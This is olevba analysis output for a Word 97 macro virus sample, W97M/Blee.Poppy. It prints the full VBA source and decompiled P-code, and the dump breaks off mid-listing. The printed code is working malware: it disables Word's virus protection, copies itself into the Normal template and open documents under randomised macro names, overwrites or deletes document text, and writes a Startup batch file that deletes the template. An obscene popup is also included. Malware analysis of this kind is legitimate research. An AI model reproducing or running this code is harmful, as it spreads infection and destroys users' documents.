olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BleeForm.frm 
in file: Virus.MSWord.Poppy.a - OLE stream: 'Macros/VBA/BleeForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























Private Sub CommandButton1_Click()
    End
End Sub

Private Sub CommandButton2_Click()
    Call BleePay
End Sub

Private Sub CommandButton3_Click()
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    WordBasic.FileSaveAs Format:=1
    End
End Sub

Private Sub Image1_Click()
    MsgBox "Blee Says....    F U C K   Y O U  !!!", vbCritical, "The Narkotic Network"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()

'W97M/Blee.Poppy
'By VicodinES
'Macro Virus for Word 97
'"Mad Sloppy Code For The Mad Sloppy Big Red Mess"

Randomize

fm = Int(Rnd * 3) + 3
    
Mrn1 = Int(Rnd * 8) + 1
Mrn2 = Int(Rnd * 8) + 1
Mrn3 = Int(Rnd * 8) + 1
Brn = Int(Rnd * 100) + 1

If Mrn2 = Mrn3 Then Mrn2 = Mrn2 + 1
If Mrn2 = Mrn1 Then Mrn2 = Mrn2 + 1
If Mrn2 > 8 Then Mrn2 = 0

If Mrn1 = Mrn3 Then Mrn1 = Mrn1 + 1
If Mrn1 = Mrn2 Then Mrn1 = Mrn1 + 1
If Mrn1 > 8 Then Mrn1 = 0

If Mrn3 = Mrn1 Then Mrn3 = Mrn3 + 1
If Mrn3 = Mrn2 Then Mrn3 = Mrn3 + 1
If Mrn3 > 8 Then Mrn3 = 0

If Mrn2 = Mrn3 Then Mrn2 = 0
If Mrn3 = Mrn2 Then Mrn2 = Mrn2 + 1
If Mrn1 = Mrn2 Then Mrn2 = Mrn2 + 1


If Mrn1 = 0 Then rename$ = "ToolsOptions"
If Mrn1 = 1 Then rename$ = "AutoClose"
If Mrn1 = 2 Then rename$ = "FileTemplates"
If Mrn1 = 3 Then rename$ = "ToolsMacro"
If Mrn1 = 4 Then rename$ = "AutoOpen"
If Mrn1 = 5 Then rename$ = "HelpAbout"
If Mrn1 = 6 Then rename$ = "AutoExec"
If Mrn1 = 7 Then rename$ = "ViewVBCode"
If Mrn1 = 8 Then rename$ = "AutoExit"

If Mrn2 = 0 Then rename2$ = "ToolsOptions"
If Mrn2 = 1 Then rename2$ = "AutoClose"
If Mrn2 = 2 Then rename2$ = "FileTemplates"
If Mrn2 = 3 Then rename2$ = "ToolsMacro"
If Mrn2 = 4 Then rename2$ = "AutoOpen"
If Mrn2 = 5 Then rename2$ = "HelpAbout"
If Mrn2 = 6 Then rename2$ = "AutoExec"
If Mrn2 = 7 Then rename2$ = "ViewVBCode"
If Mrn2 = 8 Then rename2$ = "AutoExit"


If Mrn3 = 0 Then rename3$ = "ToolsOptions"
If Mrn3 = 1 Then rename3$ = "AutoClose"
If Mrn3 = 2 Then rename3$ = "FileTemplates"
If Mrn3 = 3 Then rename3$ = "ToolsMacro"
If Mrn3 = 4 Then rename3$ = "AutoOpen"
If Mrn3 = 5 Then rename3$ = "HelpAbout"
If Mrn3 = 6 Then rename3$ = "AutoExec"
If Mrn3 = 7 Then rename3$ = "ViewVBCode"
If Mrn3 = 8 Then rename3$ = "AutoExit"

If Brn = 99 Then BleeForm.Show
If Brn = 99 Then GoTo Hell
If Brn = 11 Then Call BleePay


With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
    

    ok$ = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    nfat = GetAttr(NormalTemplate.FullName)
    
    If nfat = vbReadOnly Then Call vBitchES("c:\windows\startm~1\programs\startup\msfile.bat")
    If nfat = vbReadOnly + vbArchive Then Call vBitchES("c:\windows\startm~1\programs\startup\msfile.bat")
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff
 
    If Soma$ = UCase(NormalTemplate) Then
        
        ao$ = WordBasic.[MacroName$](fm, 0)
        fat = GetAttr(ActiveDocument.FullName)
        
        If fat >= vbArchive Then ok$ = 1
        If fat >= vbSystem Then ok$ = 1
        If fat >= vbHidden Then ok$ = 1

        If ok$ = 1 Then
        
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="BleeForm", Object:= _
        wdOrganizerObjectProjectItems
            
            If rename$ = "AutoOpen" Then backup$ = "VicodinES"
            If rename2$ = "AutoOpen" Then backup$ = "VicodinES"
            If ao$ = "AutoOpen" Then backup$ = "VicodinES"
            If backup$ <> "VicodinES" Then backup$ = "AutoOpen"
            
        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = backup$
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
            
            Application.OrganizerRename Source:= _
        ActiveDocument.FullName, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems

            Next X
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
            
        End If
    Else
               
        ao$ = "AutoOpen"
              
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:="BleeForm", Object:= _
        wdOrganizerObjectProjectItems
        
        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = rename3$
            
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
        Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
        
        Next X
        

        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
    End If
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0

End Sub
Sub BleePay()
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "he"
        .Replacement.Text = " ** The Mighty Blee ** "
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    
    Selection.Find.Execute Replace:=wdReplaceAll
    WordBasic.FileSaveAs Format:=1
    
End Sub
Sub vBitchES(strFile As String)
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 Part333$ = "c:\windows\startm~1\programs\startup\msfile.bat"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + Part333$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poppy.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/BleeForm - 2938 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #30:
' 	End 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #34:
' 	ArgsCall (Call) BleePay 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' Line #37:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #38:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #39:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #40:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #41:
' 	End 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Private Sub Image1_Click())
' Line #45:
' 	LitStr 0x0025 "Blee Says....    F U C K   Y O U  !!!"
' 	Ld vbCritical 
' 	LitStr 0x0014 "The Narkotic Network"
' 	ArgsCall MsgBox 0x0003 
' Line #46:
' 	EndSub 
' Macros/VBA/AutoOpen - 15973 bytes
' Line #0:
' 	FuncDefn (Public Sub Main())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x000F "W97M/Blee.Poppy"
' Line #3:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #4:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #5:
' 	QuoteRem 0x0000 0x0031 ""Mad Sloppy Code For The Mad Sloppy Big Red Mess""
' Line #6:
' Line #7:
' 	ArgsCall Read 0x0000 
' Line #8:
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0003 
' 	Add 
' 	St fm 
' Line #10:
' Line #11:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' Line #12:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn3 
' Line #14:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Brn 
' Line #15:
' Line #16:
' 	Ld Mrn2 
' 	Ld Mrn3 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #17:
' 	Ld Mrn2 
' 	Ld Mrn1 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #18:
' 	Ld Mrn2 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn2 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld Mrn1 
' 	Ld Mrn3 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn1 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' 	EndIf 
' Line #21:
' 	Ld Mrn1 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn1 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn1 
' 	EndIf 
' Line #22:
' 	Ld Mrn1 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn1 
' 	EndIf 
' Line #23:
' Line #24:
' 	Ld Mrn3 
' 	Ld Mrn1 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn3 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn3 
' 	EndIf 
' Line #25:
' 	Ld Mrn3 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn3 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn3 
' 	EndIf 
' Line #26:
' 	Ld Mrn3 
' 	LitDI2 0x0008 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn3 
' 	EndIf 
' Line #27:
' Line #28:
' 	Ld Mrn2 
' 	Ld Mrn3 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Mrn2 
' 	EndIf 
' Line #29:
' 	Ld Mrn3 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #30:
' 	Ld Mrn1 
' 	Ld Mrn2 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mrn2 
' 	EndIf 
' Line #31:
' Line #32:
' Line #33:
' 	Ld Mrn1 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St rename$ 
' 	EndIf 
' Line #34:
' 	Ld Mrn1 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St rename$ 
' 	EndIf 
' Line #35:
' 	Ld Mrn1 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St rename$ 
' 	EndIf 
' Line #36:
' 	Ld Mrn1 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St rename$ 
' 	EndIf 
' Line #37:
' 	Ld Mrn1 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St rename$ 
' 	EndIf 
' Line #38:
' 	Ld Mrn1 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St rename$ 
' 	EndIf 
' Line #39:
' 	Ld Mrn1 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St rename$ 
' 	EndIf 
' Line #40:
' 	Ld Mrn1 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St rename$ 
' 	EndIf 
' Line #41:
' 	Ld Mrn1 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St rename$ 
' 	EndIf 
' Line #42:
' Line #43:
' 	Ld Mrn2 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St rename2$ 
' 	EndIf 
' Line #44:
' 	Ld Mrn2 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St rename2$ 
' 	EndIf 
' Line #45:
' 	Ld Mrn2 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St rename2$ 
' 	EndIf 
' Line #46:
' 	Ld Mrn2 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St rename2$ 
' 	EndIf 
' Line #47:
' 	Ld Mrn2 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St rename2$ 
' 	EndIf 
' Line #48:
' 	Ld Mrn2 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St rename2$ 
' 	EndIf 
' Line #49:
' 	Ld Mrn2 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St rename2$ 
' 	EndIf 
' Line #50:
' 	Ld Mrn2 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St rename2$ 
' 	EndIf 
' Line #51:
' 	Ld Mrn2 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St rename2$ 
' 	EndIf 
' Line #52:
' Line #53:
' Line #54:
' 	Ld Mrn3 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "ToolsOptions"
' 	St rename3$ 
' 	EndIf 
' Line #55:
' 	Ld Mrn3 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "AutoClose"
' 	St rename3$ 
' 	EndIf 
' Line #56:
' 	Ld Mrn3 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "FileTemplates"
' 	St rename3$ 
' 	EndIf 
' Line #57:
' 	Ld Mrn3 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ToolsMacro"
' 	St rename3$ 
' 	EndIf 
' Line #58:
' 	Ld Mrn3 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St rename3$ 
' 	EndIf 
' Line #59:
' 	Ld Mrn3 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "HelpAbout"
' 	St rename3$ 
' 	EndIf 
' Line #60:
' 	Ld Mrn3 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExec"
' 	St rename3$ 
' 	EndIf 
' Line #61:
' 	Ld Mrn3 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "ViewVBCode"
' 	St rename3$ 
' 	EndIf 
' Line #62:
' 	Ld Mrn3 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoExit"
' 	St rename3$ 
' 	EndIf 
' Line #63:
' Line #64:
' 	Ld Brn 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld BleeForm 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #65:
' 	Ld Brn 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Hell 
' 	EndIf 
' Line #66:
' 	Ld Brn 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) BleePay 0x0000 
' 	EndIf 
' Line #67:
' Line #68:
' Line #69:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #70:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #71:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #72:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #73:
' 	EndWith 
' Line #74:
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' Line #77:
' Line #78:
' 	LitDI2 0x0000 
' 	St ok$ 
' Line #79:
' Line #80:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Soma$ 
' Line #81:
' Line #82:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St nfat 
' Line #83:
' Line #84:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #85:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #86:
' Line #87:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #88:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #89:
' Line #90:
' 	Ld Soma$ 
' 	Ld NormalTemplate 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	IfBlock 
' Line #91:
' Line #92:
' 	Ld fm 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St ao$ 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St fat 
' Line #94:
' Line #95:
' 	Ld fat 
' 	Ld vbArchive 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #96:
' 	Ld fat 
' 	Ld vbSystem 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #97:
' 	Ld fat 
' 	Ld vbHidden 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #98:
' Line #99:
' 	Ld ok$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #100:
' Line #101:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "BleeForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #102:
' Line #103:
' 	Ld rename$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #104:
' 	Ld rename2$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #105:
' 	Ld ao$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "VicodinES"
' 	St backup$ 
' 	EndIf 
' Line #106:
' 	Ld backup$ 
' 	LitStr 0x0009 "VicodinES"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "AutoOpen"
' 	St backup$ 
' 	EndIf 
' Line #107:
' Line #108:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #109:
' Line #110:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename$ 
' 	St Mac$ 
' 	EndIf 
' Line #111:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename2$ 
' 	St Mac$ 
' 	EndIf 
' Line #112:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld backup$ 
' 	St Mac$ 
' 	EndIf 
' Line #113:
' Line #114:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #115:
' Line #116:
' 	LineCont 0x000C 05 00 08 00 0D 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld Mac$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #117:
' Line #118:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' Line #120:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #121:
' Line #122:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #123:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentDirty 0x0001 
' Line #124:
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	ElseBlock 
' Line #127:
' Line #128:
' 	LitStr 0x0008 "AutoOpen"
' 	St ao$ 
' Line #129:
' Line #130:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "BleeForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #131:
' Line #132:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #133:
' Line #134:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename$ 
' 	St Mac$ 
' 	EndIf 
' Line #135:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename2$ 
' 	St Mac$ 
' 	EndIf 
' Line #136:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld rename3$ 
' 	St Mac$ 
' 	EndIf 
' Line #137:
' Line #138:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #139:
' Line #140:
' 	LineCont 0x000C 05 00 08 00 0D 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ao$ 
' 	ParamNamed New 
' 	Ld Mac$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #141:
' Line #142:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #143:
' Line #144:
' Line #145:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
